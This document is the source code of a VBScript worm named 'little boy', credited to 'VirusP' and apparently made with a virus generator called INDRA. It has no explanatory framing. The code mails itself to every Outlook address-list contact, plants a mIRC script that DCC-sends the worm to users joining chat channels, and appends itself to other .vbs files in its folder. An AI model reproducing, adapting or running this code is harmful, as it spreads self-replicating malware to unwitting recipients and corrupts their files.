'unrjuxkphlqjpsa
'Worm Name: little boy
'Written By: VirusP
'[INDRA]
On Error Resume Next
jpjcociquobxtyj = WScript.ScriptFullName
Set wcavvgusdvgucrm = CreateObject("WScript.Shell") 
Set qfyatcekocpfuba = CreateObject("Scripting.FileSystemObject")
Set lecasihrslluvnd = CreateObject("Outlook.Application")
If lecasihrslluvnd <> "" Then
Set fjyuvowexwbpqon = lecasihrslluvnd.GetNameSpace("MAPI")
For pykwjhhagjschbq = 1 to fjyuvowexwbpqon.AddressLists.Count
Set pmmhbkmkjrgthve = lecasihrslluvnd.CreateItem(0)
Set qodwrdptbsvbqgi = fjyuvowexwbpqon.AddressLists.Item(pykwjhhagjschbq)
pmmhbkmkjrgthve.Attachments.Add jpjcociquobxtyj
pmmhbkmkjrgthve.Subject = "Hi!"
pmmhbkmkjrgthve.Body = "Fuck off"
Set xohcukfrrmsyvaj = qodwrdptbsvbqgi.AddressEntries
Set xhxnnpjotsecxsy = pmmhbkmkjrgthve.Recipients
For xsubafbdvkqvgak = 1 to xohcukfrrmsyvaj.Count
pmmhbkmkjrgthve.Recipients.Add xohcukfrrmsyvaj.Item(xsubafbdvkqvgak)
Next
pmmhbkmkjrgthve.Send
Next
End If
Set fvnaggypstywxmi = qfyatcekocpfuba.CreateTextFile("C:\mirc\script.ini", True)
fvnaggypstywxmi.WriteLine "[script]"
fvnaggypstywxmi.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
fvnaggypstywxmi.Write "n1=/dcc           send         $nick """
fvnaggypstywxmi.Write jpjcociquobxtyj
fvnaggypstywxmi.WriteLine """ }"
fvnaggypstywxmi.Close
Set kashwyonucilakv = qfyatcekocpfuba.OpenTextFile(jpjcociquobxtyj, 1, 0)
susuafawcydlhgk = kashwyonucilakv.ReadAll
kashwyonucilakv.Close
bnjrthfrxagbcst = "'" + Right(susuafawcydlhgk, Len(susuafawcydlhgk)-InStr(susuafawcydlhgk, "'unrjuxkphlqjpsa"))
ajxdpvfsawrlhfx = Left(jpjcociquobxtyj, InStrRev(jpjcociquobxtyj, "\"))
For Each gsqxwqqsuxlxeao in qfyatcekocpfuba.GetFolder(ajxdpvfsawrlhfx).Files
If ( Right(gsqxwqqsuxlxeao.Name, 4) = ".vbs" ) Then
Set ghnhbnpcpeluymc = qfyatcekocpfuba.OpenTextFile(gsqxwqqsuxlxeao.Name, 1, 0)
If (InStr(ghnhbnpcpeluymc.ReadAll, "[INDRA]") = 0) Then
Set tgtaaumflbnxpxc = qfyatcekocpfuba.OpenTextFile(gsqxwqqsuxlxeao.Name, 8, 0)
tgtaaumflbnxpxc.Write vbCrLf + bnjrthfrxagbcst
tgtaaumflbnxpxc.Close
End If
ghnhbnpcpeluymc.Close
End If
Next
'Generated with [INDRA] v0.3.
